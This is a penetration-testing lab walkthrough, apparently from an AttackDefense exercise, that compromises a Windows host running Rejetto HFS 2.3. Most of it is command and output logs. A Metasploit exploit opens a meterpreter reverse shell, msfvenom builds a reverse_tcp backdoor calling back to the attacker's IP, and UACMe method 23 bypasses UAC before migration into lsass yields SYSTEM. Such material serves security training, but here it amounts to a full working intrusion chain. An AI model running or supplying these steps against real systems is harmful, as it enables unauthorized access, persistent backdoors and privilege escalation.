# Bypassing UAC with UACMe

**UACME:**

* Defeat Windows User Account Control (UAC) and get Administrator privileges.
* It abuses the built-in Windows AutoElevate executables.
* It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version.
* Developed by https://twitter.com/hFireF0X
* Written majorly in C, with some code in C++

```sh
root@attackdefense:~# nmap 10.5.17.167 -p80 --script=http-enum -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-31 22:18 IST
Nmap scan report for 10.5.17.167
Host is up (0.0013s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```sh
msf6 > search Rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.19.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.5.17.167
rhosts => 10.5.17.167
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.19.3:4444 
[*] Using URL: http://0.0.0.0:8080/74Nw8K5pjhl
[*] Local IP: http://10.10.19.3:8080/74Nw8K5pjhl
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /74Nw8K5pjhl
[*] Sending stage (175174 bytes) to 10.5.17.167
[*] Meterpreter session 1 opened (10.10.19.3:4444 -> 10.5.17.167:49384) at 2023-12-31 22:20:24 +0530
[!] Tried to delete %TEMP%\ZjtcCLu.vbs, unknown result
[*] Server stopped.

meterpreter > dir
Listing: C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
=====================================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2023-12-31 22:07:17 +0530  %TEMP%
100666/rw-rw-rw-  174     fil   2020-12-15 14:41:48 +0530  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-16 19:28:52 +0530  hfs.exe



meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > pgrep explorer
2368
meterpreter > migrate 2368
[*] Migrating from 2868 to 2368...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows


meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege


meterpreter > 
meterpreter > 
meterpreter > 
meterpreter > shell
Process 1836 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net user
net user

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
The command completed successfully.



C:\Windows\system32>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.


C:\Windows\system32>net user admin password123
net user admin password123
System error 5 has occurred.

Access is denied.


```

{% embed url="https://github.com/hfiref0x/UACME" %}

we will use method no. 23.

```sh
root@attackdefense:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.3 LPORT=1234 -f exe > backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

```sh
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.19.3
LHOST => 10.10.19.3
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.19.3:1234 
```

```sh
meterpreter > cd C:\\
meterpreter > mkdir Temp
Creating directory: Temp
meterpreter > cd Temp 
meterpreter > upload backdoor.exe
[*] uploading  : /root/backdoor.exe -> backdoor.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/backdoor.exe -> backdoor.exe
[*] uploaded   : /root/backdoor.exe -> backdoor.exe

meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
[*] uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] uploaded   : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe

meterpreter > shell
Process 2900 created.
Channel 4 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Temp

12/31/2023  05:21 PM    <DIR>          .
12/31/2023  05:21 PM    <DIR>          ..
12/31/2023  05:21 PM           199,168 Akagi64.exe
12/31/2023  05:20 PM            73,802 backdoor.exe
               2 File(s)        272,970 bytes
               2 Dir(s)   8,282,140,672 bytes free

C:\Temp>.\Akagi64.exe 23 C:\\Temp\backdoor.exe                    
.\Akagi64.exe 23 C:\\Temp\backdoor.exe

C:\Temp>

```

```sh
meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege


meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 236   4     smss.exe              x64   0                                      
 332   324   csrss.exe             x64   0                                      
 396   388   csrss.exe             x64   1                                      
 404   324   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 432   388   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 488   404   services.exe          x64   0                                      
 496   404   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 500   488   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 560   488   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 604   488   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 636   488   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 700   432   dwm.exe               x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 708   488   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 724   2168  hfs.exe               x86   1        VICTIM\admin                  C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe
 764   488   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 796   488   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 868   488   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1004  488   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1040  488   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1088  488   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1132  488   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1404  488   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 1524  2900  conhost.exe           x64   1        VICTIM\admin                  C:\Windows\System32\conhost.exe
 1532  560   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1904  488   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2008  488   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2116  764   taskhostex.exe        x64   1        VICTIM\admin                  C:\Windows\System32\taskhostex.exe
 2160  2164  conhost.exe           x64   1        VICTIM\admin                  C:\Windows\System32\conhost.exe
 2164  2656  cmd.exe               x86   1        VICTIM\admin                  C:\Windows\SysWOW64\cmd.exe
 2168  2160  explorer.exe          x64   1        VICTIM\admin                  C:\Windows\explorer.exe
 2312  1992  backdoor.exe          x86   1        VICTIM\admin                  C:\Temp\backdoor.exe
 2900  2168  cmd.exe               x64   1        VICTIM\admin                  C:\Windows\System32\cmd.exe


meterpreter > migrate 496
[*] Migrating from 2312 to 496...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
